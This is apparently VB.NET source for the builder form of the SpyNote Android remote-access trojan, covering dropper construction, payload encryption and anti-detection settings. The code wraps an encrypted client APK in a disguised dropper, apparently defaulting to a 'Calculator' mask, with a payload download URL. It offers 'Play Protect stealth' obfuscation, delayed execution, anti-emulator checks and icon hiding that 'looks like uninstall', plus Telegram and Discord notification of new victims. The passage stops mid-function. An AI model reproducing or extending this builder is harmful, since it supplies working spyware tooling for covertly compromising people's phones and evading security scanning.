Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Linq
Imports Microsoft.VisualBasic.CompilerServices
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports System.Xml

Public Class Build
    Private sGet As String
    Private colo As Color
    Private colo1 As Color

    Public Sub New()
        Me.sGet = Nothing
        Me.colo = Color.FromArgb(57, 57, 58)
        Me.colo1 = Color.FromArgb(27, 27, 28)
        Me.InitializeComponent()
    End Sub

    Private Sub Build_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Try
            If Store.Resources(1) IsNot Nothing Then
                MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\16.ico"))
            End If
        Catch
        End Try
        Me.TextBox1.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox2.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox3.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox4.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox5.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox6.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox7.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox8.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.PictureBox2.Image = Store.Bitmap_0("\Payload\b0")
        Dim flag As Boolean = False
        Dim environmentVariable As String = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User)
        If (environmentVariable IsNot Nothing) Then
            flag = If(Not My.Computer.FileSystem.DirectoryExists(environmentVariable), True, False)
        End If
        If (Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) Is Nothing Or flag) Then
            My.Forms.JV.ShowDialog()
            If (My.Forms.JV.DialogResult <> System.Windows.Forms.DialogResult.OK) Then
                My.Forms.JV.Close()
                MyBase.Close()
            Else
                Dim text As String = Nothing
                Try
                    text = My.Forms.JV.aFileName.Text
                    text = (New FileInfo(text)).DirectoryName
                Catch exception As System.Exception
                    ProjectData.SetProjectError(exception)
                    My.Forms.JV.Close()
                    MyBase.Close()
                    ProjectData.ClearProjectError()
                End Try
                Environment.SetEnvironmentVariable("Path", text, EnvironmentVariableTarget.User)
                My.Forms.JV.Close()
            End If
        End If
        Dim str As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
        If Store.Resources(1) Is Nothing OrElse Not File.Exists(str) Then
            MessageBox.Show("Payload folder not found. Check Resources path.", "Build", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Return
        End If
        Dim strArrays As String() = File.ReadAllLines(str)
        If (CInt(strArrays.Length) >= 10) Then
            Dim length As Integer = CInt(strArrays.Length)
            Dim num As Integer = 0
            While num <= length
                If (num <= 10) Then
                    Select Case num
                        Case 0
                            If (Not File.Exists(strArrays(num))) Then
                                Dim str1 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
                                If (File.Exists(str1)) Then
                                    Me.PictureBox1.ImageLocation = str1
                                    Me.Label1.Tag = str1
                                    Me.ThemeButton1.Tag = "0"
                                    Me.ThemeButton1.Text = "Select icon"
                                    Me.Label1.Text = "default"
                                End If
                            Else
                                Me.PictureBox1.ImageLocation = strArrays(num)
                                Me.Label1.Tag = strArrays(num)
                                Dim str2 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
                                If (Operators.CompareString(strArrays(num), str2, False) <> 0) Then
                                    Me.ThemeButton1.Text = "Delete"
                                    Me.Label1.Text = strArrays(num)
                                    Me.ThemeButton1.Tag = "1"
                                Else
                                    Me.ThemeButton1.Text = "Select icon"
                                    Me.Label1.Text = "default"
                                    Me.ThemeButton1.Tag = "0"
                                End If
                            End If
                            Exit Select
                        Case 1
                            Me.TextBox1.Text = strArrays(num)
                            Exit Select
                        Case 2
                            Me.TextBox2.Text = strArrays(num)
                            Exit Select
                        Case 3
                            Me.TextBox3.Text = strArrays(num)
                            Exit Select
                        Case 4
                            Me.TextBox4.Text = strArrays(num)
                            Exit Select
                        Case 5
                            Me.TextBox5.Text = strArrays(num)
                            Exit Select
                        Case 6
                            Me.TextBox6.Text = strArrays(num)
                            Exit Select
                        Case 7
                            If (Operators.CompareString(strArrays(num), "null", False) <> 0) Then
                                Me.TextBox7.Enabled = True
                                Me.Pi6.Tag = "OK"
                                Me.TextBox7.Text = strArrays(num)
                            Else
                                Me.TextBox7.Enabled = False
                                Me.Pi6.Tag = "-"
                                Me.TextBox7.Text = strArrays(num)
                            End If
                            Exit Select
                        Case 8
                            If (strArrays(num)(0) = "1"c) Then
                                Me.c1()
                            End If
                            If (strArrays(num)(1) = "1"c) Then
                                Me.c2()
                            End If
                            If (strArrays(num)(2) = "1"c) Then
                                Me.c3()
                            End If
                            If (strArrays(num)(3) = "1"c) Then
                                Me.c4()
                            End If
                            If (strArrays(num)(4) = "1"c) Then
                                Me.c5()
                            End If
                            Exit Select
                        Case 9
                            If (Not File.Exists(strArrays(num))) Then
                                Me.Label14.Text = ".."
                                Me.TextBox8.Enabled = False
                                Me.TextBox8.Text = ".."
                                Me.Label15.Enabled = False
                                Me.ThemeButton3.Tag = "0"
                                Me.ThemeButton3.Text = "Select File"
                            Else
                                Me.Label14.Text = strArrays(num)
                                Me.TextBox8.Enabled = True
                                Me.Label15.Enabled = True
                                Me.ThemeButton3.Tag = "1"
                                Me.ThemeButton3.Text = "Delete"
                            End If
                            Exit Select
                        Case 10
                            If (Not Operators.ConditionalCompareObjectEqual(Me.ThemeButton3.Tag, "0", False)) Then
                                Me.TextBox8.Text = strArrays(num)
                            Else
                                Me.TextBox8.Text = ".."
                            End If
                            Exit Select
                    End Select
                    num = num + 1
                Else
                    Exit While
                End If
            End While
        End If
        Me.PBil.ImageLocation = String.Concat(Store.Resources(1), "\Icons\Payload\Bi.png")
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True

        ' Загружаем настройки защиты и Dropper
        LoadProtectionSettings()
        InitializeProtectionExtras()
        LoadProtectionUiExtras()
        ' Ensure Dropper tab and controls are created before loading its settings
        InitializeDropperTab()
        LoadDropperSettings()
        LoadSettings()
        If Me.cbNotifyType.SelectedIndex = -1 AndAlso Me.cbNotifyType.Items.Count > 0 Then
            Me.cbNotifyType.SelectedIndex = 0
        End If
        UpdateVisibility()
    End Sub

    ' -----  DROPPER  -----
    Private Sub InitializeDropperTab()
        ' Создаём вкладку, если её нет
        If Not ThemeTabControl1.TabPages.ContainsKey("TabPage7") Then
            Dim tabPage As New TabPage()
            tabPage.Name = "TabPage7"
            tabPage.Text = "Dropper"
            tabPage.BackColor = Color.FromArgb(45, 45, 48)
            tabPage.Size = New Size(404, 353)

            ' Группа Dropper
            Dim grpDropper As New GroupBox()
            grpDropper.Name = "grpDropper_Dropper"
            grpDropper.Text = "Dropper Settings"
            grpDropper.Location = New Point(10, 10)
            grpDropper.Size = New Size(380, 200)
            grpDropper.ForeColor = Color.FromArgb(241, 241, 241)

            ' Чекбокс включения
            Dim chkDropperMode As New CheckBox()
            chkDropperMode.Name = "chkDropperMode_Dropper"
            chkDropperMode.Text = "Enable Dropper Mode (two-stage installation)"
            chkDropperMode.Location = New Point(10, 20)
            chkDropperMode.Size = New Size(300, 20)
            chkDropperMode.ForeColor = Color.FromArgb(241, 241, 241)
            chkDropperMode.BackColor = Color.FromArgb(45, 45, 48)
            AddHandler chkDropperMode.CheckedChanged, AddressOf Me.chkDropperMode_CheckedChanged

            ' Метка
            Dim lblTemplate As New Label()
            lblTemplate.Text = "Template APK path:"
            lblTemplate.Location = New Point(10, 55)
            lblTemplate.Size = New Size(120, 20)
            lblTemplate.ForeColor = Color.FromArgb(241, 241, 241)

            ' Поле пути
            Dim txtTemplatePath As New TextBox()
            txtTemplatePath.Name = "txtDropperTemplatePath"
            txtTemplatePath.Location = New Point(130, 52)
            txtTemplatePath.Size = New Size(160, 23)
            txtTemplatePath.BackColor = Color.FromArgb(37, 37, 38)
            txtTemplatePath.ForeColor = Color.FromArgb(241, 241, 241)
            txtTemplatePath.BorderStyle = BorderStyle.FixedSingle

            ' Кнопка Browse
            Dim btnBrowseTemplate As New Button()
            btnBrowseTemplate.Text = "Browse"
            btnBrowseTemplate.Location = New Point(300, 50)
            btnBrowseTemplate.Size = New Size(70, 25)
            btnBrowseTemplate.BackColor = Color.FromArgb(53, 53, 60)
            btnBrowseTemplate.ForeColor = Color.FromArgb(241, 241, 241)
            AddHandler btnBrowseTemplate.Click, AddressOf Me.BrowseTemplate_Click

            Dim lblPayloadUrl As New Label()
            lblPayloadUrl.Text = "Payload URL (HTTP):"
            lblPayloadUrl.Location = New Point(10, 95)
            lblPayloadUrl.Size = New Size(120, 20)
            lblPayloadUrl.ForeColor = Color.FromArgb(241, 241, 241)

            Dim txtPayloadUrl As New TextBox()
            txtPayloadUrl.Name = "txtPayloadUrl"
            txtPayloadUrl.Location = New Point(130, 92)
            txtPayloadUrl.Size = New Size(240, 23)
            txtPayloadUrl.BackColor = Color.FromArgb(37, 37, 38)
            txtPayloadUrl.ForeColor = Color.FromArgb(241, 241, 241)
            txtPayloadUrl.BorderStyle = BorderStyle.FixedSingle
            txtPayloadUrl.Text = "https://your-server.com/client.apk"

            grpDropper.Controls.Add(chkDropperMode)
            grpDropper.Controls.Add(lblTemplate)
            grpDropper.Controls.Add(txtTemplatePath)
            grpDropper.Controls.Add(btnBrowseTemplate)
            grpDropper.Controls.Add(lblPayloadUrl)
            grpDropper.Controls.Add(txtPayloadUrl)

            ' Добавляем группу на вкладку
            tabPage.Controls.Add(grpDropper)

            ' Добавляем вкладку в TabControl
            ThemeTabControl1.TabPages.Add(tabPage)
        End If
    End Sub

    ' Helper to safely get the Dropper GroupBox from TabPage7
    Private Function GetDropperGroupBox() As GroupBox
        Try
            Dim tp = If(ThemeTabControl1.TabPages.ContainsKey("TabPage7"), ThemeTabControl1.TabPages("TabPage7"), Nothing)
            If tp Is Nothing Then Return Nothing
            ' Prefer named control
            For Each c As Control In tp.Controls
                If TypeOf c Is GroupBox AndAlso c.Name = "grpDropper_Dropper" Then
                    Return DirectCast(c, GroupBox)
                End If
            Next
            ' Fallback to first GroupBox
            For Each c As Control In tp.Controls
                If TypeOf c Is GroupBox Then
                    Return DirectCast(c, GroupBox)
                End If
            Next
        Catch
        End Try
        Return Nothing
    End Function

    ' ----- Обработчики для Dropper -----
    Private Sub BrowseTemplate_Click(sender As Object, e As EventArgs)
        Using ofd As New OpenFileDialog()
            ofd.Filter = "APK files (*.apk)|*.apk|All files (*.*)|*.*"
            ofd.Title = "Select Dropper Template APK"
            If ofd.ShowDialog() = DialogResult.OK Then
                ' Find the txtTemplatePath inside Dropper group safely
                Dim grp = GetDropperGroupBox()
                If grp IsNot Nothing Then
                    Dim txt As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
                    If txt IsNot Nothing Then
                        txt.Text = ofd.FileName
                        SaveDropperSettings()
                    End If
                End If
            End If
        End Using
    End Sub

    Private Sub chkDropperMode_CheckedChanged(sender As Object, e As EventArgs)
        Dim chk As CheckBox = TryCast(sender, CheckBox)
        If chk Is Nothing Then Return
        Dim grp As GroupBox = GetDropperGroupBox()
        If grp IsNot Nothing Then
            grp.Enabled = chk.Checked
            SaveDropperSettings()
        End If
    End Sub

    Private Sub SaveDropperSettings()
        Try
            Dim grp As GroupBox = GetDropperGroupBox()
            If grp Is Nothing Then Return
            Dim chk As CheckBox = TryCast(grp.Controls("chkDropperMode_Dropper"), CheckBox)
            Dim txt As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
            If chk IsNot Nothing Then My.Settings("DropperMode") = chk.Checked.ToString()
            If txt IsNot Nothing Then My.Settings("TemplatePath") = txt.Text
            My.Settings.Save()
        Catch
        End Try
    End Sub

    Private Sub LoadDropperSettings()
        Try
            Dim grp As GroupBox = GetDropperGroupBox()
            If grp Is Nothing Then Return
            Dim chk As CheckBox = TryCast(grp.Controls("chkDropperMode_Dropper"), CheckBox)
            Dim txt As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
            If chk IsNot Nothing Then
                chk.Checked = Convert.ToBoolean(If(My.Settings("DropperMode") IsNot Nothing, My.Settings("DropperMode").ToString(), "False"))
            End If
            If txt IsNot Nothing AndAlso My.Settings("TemplatePath") IsNot Nothing Then
                txt.Text = My.Settings("TemplatePath").ToString()
            End If
            If chk IsNot Nothing AndAlso grp IsNot Nothing Then grp.Enabled = chk.Checked
        Catch
        End Try
    End Sub

    ' ----- Логика сборки Dropper (вставляется в ThemeButton2_Click) -----
    Private Sub BuildDropper(packageName As String, aesKey As Byte(), appName As String, iconPath As String)
        Try
            ' 1. Получаем путь к шаблону
            Dim grp As GroupBox = GetDropperGroupBox()
            If grp Is Nothing Then
                MessageBox.Show("Dropper controls not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If
            Dim txtTemplate As TextBox = TryCast(grp.Controls("txtDropperTemplatePath"), TextBox)
            Dim templatePath As String = If(txtTemplate IsNot Nothing, txtTemplate.Text, String.Empty)
            If String.IsNullOrEmpty(templatePath) OrElse Not File.Exists(templatePath) Then
                ' Пытаемся взять встроенный шаблон
                templatePath = Path.Combine(Store.Resources(1), "Dropper", "DropperTemplate.apk")
                If Not File.Exists(templatePath) Then
                    MessageBox.Show("Dropper template APK not found! Please specify a valid template.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Return
                End If
            End If

            ' 2. Путь к client.apk
            Dim clientApkPath As String = ApkNotifyPatcher.GetBuildingClientApkPath()
            If Not File.Exists(clientApkPath) Then
                clientApkPath = Path.Combine(Store.Resources(1), "Imports", "Payload", "client.apk")
            End If
            If Not File.Exists(clientApkPath) Then
                MessageBox.Show("Client APK not found! Build client first.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            Dim publishDir As String = Path.Combine(ApkNotifyPatcher.GetDriveRoot(), "Building-6.1", "apktool", "out", "publish")
            Directory.CreateDirectory(publishDir)
            Dim publishedApk As String = Path.Combine(publishDir, "client.apk")
            File.Copy(clientApkPath, publishedApk, True)

            Dim txtUrl As TextBox = TryCast(grp.Controls("txtPayloadUrl"), TextBox)
            Dim payloadUrl As String = If(txtUrl IsNot Nothing, txtUrl.Text.Trim(), String.Empty)
            If String.IsNullOrWhiteSpace(payloadUrl) Then
                payloadUrl = "file:///" & publishedApk.Replace("\"c, "/"c)
            End If

            ' 3. Читаем APK bytes для fallback (payload.enc)
            Dim apkBytes As Byte() = File.ReadAllBytes(clientApkPath)
            Dim encryptedApk As Byte() = EncryptPayload(apkBytes, aesKey)

            ' 5. Работаем с шаблонным APK
            Dim workDir As String = Path.Combine(Store.Resources(1), "Dropper", "Work")
            Directory.CreateDirectory(workDir)
            Dim outputApkPath As String = Path.Combine(workDir, "output.apk")
            File.Copy(templatePath, outputApkPath, True)

            Using zip As ZipFile = ZipFile.Read(outputApkPath)
                ' Заменяем AndroidManifest.xml (бинарный, но мы попробуем)
                ReplaceManifest(zip, packageName, appName, iconPath)

                ' Заменяем иконку
                ReplaceIcon(zip, iconPath)

                ' Добавляем зашифрованный DEX в папку assets
                zip.AddEntry("assets/payload_url.txt", Encoding.UTF8.GetBytes(payloadUrl))
                zip.AddEntry("assets/app_mask.txt", Encoding.UTF8.GetBytes(If(String.IsNullOrWhiteSpace(appName), "Calculator", appName)))
                zip.AddEntry("assets/payload.enc", encryptedApk)

                zip.Save()
            End Using

            ' 6. Подписываем APK
            Dim keystorePath As String = Path.Combine(Store.Resources(1), "Dropper", "test.keystore")
            If Not File.Exists(keystorePath) Then
                GenerateTestKeystore(keystorePath)
            End If
            SignApk(outputApkPath, keystorePath)

            ' 7. Копируем готовый Dropper в финальную папку
            Dim finalApkPath As String = Path.Combine(Store.Resources(1), "Dropper", "Dropper_final.apk")
            File.Copy(outputApkPath, finalApkPath, True)

            MessageBox.Show("Dropper APK created:" & vbCrLf & finalApkPath & vbCrLf & vbCrLf &
                            "Publish client.apk at:" & vbCrLf & publishedApk & vbCrLf & vbCrLf &
                            "Payload URL:" & vbCrLf & payloadUrl,
                            "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("Dropper build error: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' ----- Вспомогательные методы для Dropper -----
    Private Function ExtractDexFromApk(apkPath As String) As Byte()
        Try
            Using zip As ZipFile = ZipFile.Read(apkPath)
                Dim dexEntry As ZipEntry = zip("classes.dex")
                If dexEntry IsNot Nothing Then
                    Using ms As New MemoryStream()
                        dexEntry.Extract(ms)
                        Return ms.ToArray()
                    End Using
                End If
            End Using
        Catch
        End Try
        Return Nothing
    End Function

    Private Sub ReplaceManifest(zip As ZipFile, packageName As String, appName As String, iconPath As String)
        ' Пытаемся найти AndroidManifest.xml (может быть бинарным, но попробуем)
        Dim manifestEntry As ZipEntry = zip("AndroidManifest.xml")
        If manifestEntry Is Nothing Then
            manifestEntry = zip.FirstOrDefault(Function(e) e.FileName.EndsWith("AndroidManifest.xml"))
        End If
        If manifestEntry IsNot Nothing Then
            Using ms As New MemoryStream()
                manifestEntry.Extract(ms)
                ms.Position = 0
                ' Пытаемся прочитать как XML (если бинарный – не получится)
                Try
                    Dim xmlDoc As New XmlDocument()
                    xmlDoc.Load(ms)
                    Dim root As XmlElement = xmlDoc.DocumentElement
                    If root IsNot Nothing Then
                        ' package
                        If root.HasAttribute("package") Then
                            root.SetAttribute("package", packageName)
                        End If
                        ' android:label
                        Dim labelAttr As XmlAttribute = root.Attributes("android:label")
                        If labelAttr Is Nothing Then
                            labelAttr = xmlDoc.CreateAttribute("android:label", "http://schemas.android.com/apk/res/android")
                            root.Attributes.Append(labelAttr)
                        End If
                        labelAttr.Value = appName
                        ' android:icon
                        Dim iconAttr As XmlAttribute = root.Attributes("android:icon")
                        If iconAttr Is Nothing Then
                            iconAttr = xmlDoc.CreateAttribute("android:icon", "http://schemas.android.com/apk/res/android")
                            root.Attributes.Append(iconAttr)
                        End If
                        iconAttr.Value = "@drawable/ic_launcher"
                    End If
                    Using outMs As New MemoryStream()
                        xmlDoc.Save(outMs)
                        outMs.Position = 0
                        zip.UpdateEntry("AndroidManifest.xml", outMs.ToArray())
                    End Using
                Catch
                    ' Если не XML, значит бинарный – не трогаем
                End Try
            End Using
        End If
    End Sub

    Private Sub ReplaceIcon(zip As ZipFile, iconPath As String)
        If Not String.IsNullOrEmpty(iconPath) AndAlso File.Exists(iconPath) Then
            Dim iconBytes As Byte() = File.ReadAllBytes(iconPath)
            ' Ищем все иконки по маске
            Dim entries = zip.Where(Function(e) e.FileName.Contains("ic_launcher") AndAlso e.FileName.EndsWith(".png"))
            For Each e As ZipEntry In entries
                zip.UpdateEntry(e.FileName, iconBytes)
            Next
        End If
    End Sub

    Private Sub GenerateTestKeystore(keystorePath As String)
        Dim dir As String = Path.GetDirectoryName(keystorePath)
        Directory.CreateDirectory(dir)
        Dim psi As New ProcessStartInfo()
        psi.FileName = "keytool"
        psi.Arguments = $"-genkey -v -keystore ""{keystorePath}"" -alias test -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname ""CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"""
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        psi.RedirectStandardOutput = True
        psi.RedirectStandardError = True
        Using p As Process = Process.Start(psi)
            p.WaitForExit()
        End Using
    End Sub

    Private Sub SignApk(apkPath As String, keystorePath As String)
        Try
            Dim psi As New ProcessStartInfo()
            psi.FileName = "jarsigner"
            psi.Arguments = $"-verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ""{keystorePath}"" -storepass 123456 -keypass 123456 ""{apkPath}"" test"
            psi.UseShellExecute = False
            psi.CreateNoWindow = True
            psi.RedirectStandardOutput = True
            psi.RedirectStandardError = True
            Using p As Process = Process.Start(psi)
                p.WaitForExit()
            End Using
        Catch ex As Exception
            MessageBox.Show("Signing failed: " & ex.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        End Try
    End Sub

    Private chkHideIconAfterSetup As CheckBox
    Private chkStealthEnabled As CheckBox
    Private chkObfuscateSmali As CheckBox
    Private chkEncryptStrings As CheckBox
    Private chkMaskManifest As CheckBox
    Private chkDelayedExecution As CheckBox
    Private numDelayMinutes As NumericUpDown

    Private Sub InitializeProtectionExtras()
        Try
            If grpProtectionOptions Is Nothing Then Return
            If grpProtectionOptions.Controls("chkStealthEnabled") IsNot Nothing Then Return

            If grpProtectionOptions.Controls("chkHideIconAfterSetup") Is Nothing Then
                chkHideIconAfterSetup = New CheckBox()
                chkHideIconAfterSetup.Name = "chkHideIconAfterSetup"
                chkHideIconAfterSetup.AutoSize = True
                chkHideIconAfterSetup.Text = "Hide icon after permissions (looks like uninstall)"
                chkHideIconAfterSetup.Location = New Point(20, 220)
                chkHideIconAfterSetup.Size = New Size(360, 18)
                chkHideIconAfterSetup.ForeColor = Color.FromArgb(241, 241, 241)
                chkHideIconAfterSetup.BackColor = Color.FromArgb(45, 45, 48)
                chkHideIconAfterSetup.Checked = False
                grpProtectionOptions.Controls.Add(chkHideIconAfterSetup)
            End If

            Dim y As Integer = 248

            chkStealthEnabled = New CheckBox()
            chkStealthEnabled.Name = "chkStealthEnabled"
            chkStealthEnabled.Text = "Play Protect stealth (obfuscate + encrypt + mask)"
            chkStealthEnabled.Location = New Point(20, y)
            chkStealthEnabled.AutoSize = True
            chkStealthEnabled.ForeColor = Color.FromArgb(241, 241, 241)
            chkStealthEnabled.Checked = False
            AddHandler chkStealthEnabled.CheckedChanged, AddressOf StealthEnabled_CheckedChanged
            grpProtectionOptions.Controls.Add(chkStealthEnabled)
            y += 22

            chkObfuscateSmali = New CheckBox()
            chkObfuscateSmali.Name = "chkObfuscateSmali"
            chkObfuscateSmali.Text = "Obfuscate smali (org/spynote -> a/b/C)"
            chkObfuscateSmali.Location = New Point(35, y)
            chkObfuscateSmali.AutoSize = True
            chkObfuscateSmali.ForeColor = Color.FromArgb(241, 241, 241)
            chkObfuscateSmali.Checked = False
            chkObfuscateSmali.Enabled = False
            grpProtectionOptions.Controls.Add(chkObfuscateSmali)
            y += 20

            chkEncryptStrings = New CheckBox()
            chkEncryptStrings.Name = "chkEncryptStrings"
            chkEncryptStrings.Text = "Encrypt strings (XOR + dynamic key)"
            chkEncryptStrings.Location = New Point(35, y)
            chkEncryptStrings.AutoSize = True
            chkEncryptStrings.ForeColor = Color.FromArgb(241, 241, 241)
            chkEncryptStrings.Checked = False
            chkEncryptStrings.Enabled = False
            grpProtectionOptions.Controls.Add(chkEncryptStrings)
            y += 20

            chkMaskManifest = New CheckBox()
            chkMaskManifest.Name = "chkMaskManifest"
            chkMaskManifest.Text = "Mask AndroidManifest (support.v7 aliases)"
            chkMaskManifest.Location = New Point(35, y)
            chkMaskManifest.AutoSize = True
            chkMaskManifest.ForeColor = Color.FromArgb(241, 241, 241)
            chkMaskManifest.Checked = False
            chkMaskManifest.Enabled = False
            grpProtectionOptions.Controls.Add(chkMaskManifest)
            y += 22

            chkDelayedExecution = New CheckBox()
            chkDelayedExecution.Name = "chkDelayedExecution"
            chkDelayedExecution.Text = "Delayed execution (optional)"
            chkDelayedExecution.Location = New Point(20, y)
            chkDelayedExecution.AutoSize = True
            chkDelayedExecution.ForeColor = Color.FromArgb(241, 241, 241)
            chkDelayedExecution.Checked = False
            chkDelayedExecution.Enabled = False
            grpProtectionOptions.Controls.Add(chkDelayedExecution)
            y += 22

            Dim lblDelay As New Label()
            lblDelay.Text = "Delay min / screen toggles / battery:"
            lblDelay.Location = New Point(35, y)
            lblDelay.AutoSize = True
            lblDelay.ForeColor = Color.FromArgb(241, 241, 241)
            lblDelay.Enabled = False
            lblDelay.Name = "lblDelayOptions"
            grpProtectionOptions.Controls.Add(lblDelay)
            y += 18

            numDelayMinutes = New NumericUpDown()
            numDelayMinutes.Name = "numDelayMinutes"
            numDelayMinutes.Location = New Point(35, y)
            numDelayMinutes.Size = New Size(60, 23)
            numDelayMinutes.Minimum = 0
            numDelayMinutes.Maximum = 1440
            numDelayMinutes.Value = 5
            numDelayMinutes.Enabled = False
            grpProtectionOptions.Controls.Add(numDelayMinutes)

            grpProtectionOptions.Size = New Size(420, y + 45)
            StealthEnabled_CheckedChanged(Nothing, EventArgs.Empty)
        Catch
        End Try
    End Sub

    Private Sub StealthEnabled_CheckedChanged(sender As Object, e As EventArgs)
        Dim enabled As Boolean = chkStealthEnabled IsNot Nothing AndAlso chkStealthEnabled.Checked
        If chkObfuscateSmali IsNot Nothing Then chkObfuscateSmali.Enabled = enabled
        If chkEncryptStrings IsNot Nothing Then chkEncryptStrings.Enabled = enabled
        If chkMaskManifest IsNot Nothing Then chkMaskManifest.Enabled = enabled
        If chkDelayedExecution IsNot Nothing Then chkDelayedExecution.Enabled = enabled
        If numDelayMinutes IsNot Nothing Then numDelayMinutes.Enabled = enabled AndAlso chkDelayedExecution IsNot Nothing AndAlso chkDelayedExecution.Checked
        Try
            Dim lbl = grpProtectionOptions?.Controls("lblDelayOptions")
            If TypeOf lbl Is Label Then DirectCast(lbl, Label).Enabled = enabled
        Catch
        End Try
    End Sub

    Private Function GetStealthCheckbox(name As String) As Boolean
        Try
            Dim ctrl = grpProtectionOptions?.Controls(name)
            If TypeOf ctrl Is CheckBox Then Return DirectCast(ctrl, CheckBox).Checked
        Catch
        End Try
        Return False
    End Function

    Private Function GetHideIconAfterSetupChecked() As Boolean
        Try
            If chkHideIconAfterSetup IsNot Nothing Then Return chkHideIconAfterSetup.Checked
            Dim ctrl = grpProtectionOptions?.Controls("chkHideIconAfterSetup")
            If TypeOf ctrl Is CheckBox Then Return DirectCast(ctrl, CheckBox).Checked
        Catch
        End Try
        Return False
    End Function

    Private Function BuildPermissionFlags() As String
        Dim str As String = String.Empty
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi1.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi3.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi4.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi5.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
        If Not GetHideIconAfterSetupChecked() AndAlso str.Length > 0 Then
            str = "0"c & str.Substring(1)
        End If
        Return str
    End Function

    Private Function GetProtectionConfigFromUi() As ApkProtectionPatcher.ProtectionConfig
        Dim stealthOn As Boolean = GetStealthCheckbox("chkStealthEnabled") OrElse (chkStealthEnabled IsNot Nothing AndAlso chkStealthEnabled.Checked)
        Dim delayMin As Integer = 5
        Try
            If numDelayMinutes IsNot Nothing Then delayMin = CInt(numDelayMinutes.Value)
        Catch
        End Try
        Return New ApkProtectionPatcher.ProtectionConfig With {
            .Enabled = chkEnableProtection IsNot Nothing AndAlso chkEnableProtection.Checked,
            .HideIconAfterSetup = GetHideIconAfterSetupChecked(),
            .AntiEmulator = chkAntiEmulator IsNot Nothing AndAlso chkAntiEmulator.Checked,
            .MaskType = If(cbMaskType IsNot Nothing AndAlso cbMaskType.SelectedItem IsNot Nothing, cbMaskType.SelectedItem.ToString(), String.Empty),
            .PackageName = If(txtPackageName IsNot Nothing, txtPackageName.Text.Trim(), String.Empty),
            .FakeActivity = If(txtFakeActivity IsNot Nothing, txtFakeActivity.Text.Trim(), String.Empty),
            .PermissionFlags = BuildPermissionFlags(),
            .StealthEnabled = stealthOn,
            .ObfuscateSmali = stealthOn AndAlso (GetStealthCheckbox("chkObfuscateSmali") OrElse (chkObfuscateSmali IsNot Nothing AndAlso chkObfuscateSmali.Checked)),
            .EncryptStrings = stealthOn AndAlso (GetStealthCheckbox("chkEncryptStrings") OrElse (chkEncryptStrings IsNot Nothing AndAlso chkEncryptStrings.Checked)),
            .MaskManifest = stealthOn AndAlso (GetStealthCheckbox("chkMaskManifest") OrElse (chkMaskManifest IsNot Nothing AndAlso chkMaskManifest.Checked)),
            .DelayedExecution = GetStealthCheckbox("chkDelayedExecution") OrElse (chkDelayedExecution IsNot Nothing AndAlso chkDelayedExecution.Checked),
            .DelayMinutes = delayMin,
            .DelayScreenToggles = 3,
            .DelayBatteryEvents = 1,
            .MaskPackageAlias = "com.android.support.v7"
        }
    End Function

    Private Function GetNotifyConfigFromUi() As NotifySettingsHelper.NotifyConfig
        Return New NotifySettingsHelper.NotifyConfig With {
            .Enabled = chkEnableNotify.Checked,
            .NotifyType = If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), "Telegram"),
            .TelegramToken = txtTelegramToken.Text.Trim(),
            .TelegramChatId = txtTelegramChatId.Text.Trim(),
            .DiscordWebhook = txtDiscordWebhook.Text.Trim()
        }
    End Function

    Private Sub RunSlExeAndWait(slExe As String)
        Dim psi As New ProcessStartInfo(slExe, " n -160")
        psi.WorkingDirectory = Path.GetDirectoryName(slExe)
        psi.WindowStyle = ProcessWindowStyle.Hidden
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        Using p As Process = Process.Start(psi)
            If Not p.WaitForExit(180000) Then
                Try
                    p.Kill()
                Catch
                End Try
